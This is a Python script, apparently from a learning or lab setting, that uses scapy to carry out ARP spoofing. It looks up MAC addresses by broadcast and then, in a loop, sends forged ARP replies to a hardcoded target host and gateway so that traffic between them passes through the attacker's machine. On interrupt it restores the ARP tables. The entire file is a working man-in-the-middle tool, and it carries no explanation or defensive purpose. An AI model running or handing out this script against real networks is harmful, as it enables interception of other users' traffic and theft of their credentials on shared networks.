import scapy.all as scapy
import time
"""
import socket   
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)  
print("Your Computer Name is:"+hostname)   
"""
import netifaces as ni
ipddd = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
#print(ipddd)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]
    
    """ 
    clients_list = []
    for i in answered_list:
        client = {"ip":i[1].psrc, "mac":i[1].hwsrc}
        clients_list.append(client)
    """       
    return answered_list[0][1].hwsrc
def spoof(targetip, spoofip):
    targetmac = get_mac(targetip)
    packet = scapy.ARP(op = 2, pdst = targetip ,hwdst = targetmac,psrc=spoofip) 
    packet2 = scapy.ARP(op = 2, pdst = targetip ,hwdst = targetmac ,psrc=ipddd , hwsrc = "00:11:22:33:44:55") 

    scapy.send(packet,verbose = False)
    scapy.send(packet2,verbose = False)

def restore(destip, srcip):
    destmac = get_mac(destip)
    srcmac = get_mac(srcip)
    packet = scapy.ARP(op=2,pdst=destip,hwdst=destmac,psrc=srcip,hwsrc = srcmac)
    scapy.send(packet)

targetip ="192.168.74.132"
gatewayip =  "192.168.74.2"
nofpack = 0
try:
    while True:
        
        spoof(targetip,gatewayip)
        spoof(gatewayip,targetip)
        time.sleep(1)
        nofpack += 2
        print(f"\r[+]Packets Sent: {nofpack}",end = "")
except KeyboardInterrupt:
    print("\nQuitting............")
    restore(targetip,gatewayip)
    restore(gatewayip,targetip)



"""
print(packet.show())
print(packet.summary())
print(packet2.show())
print(packet2.summary())
"""
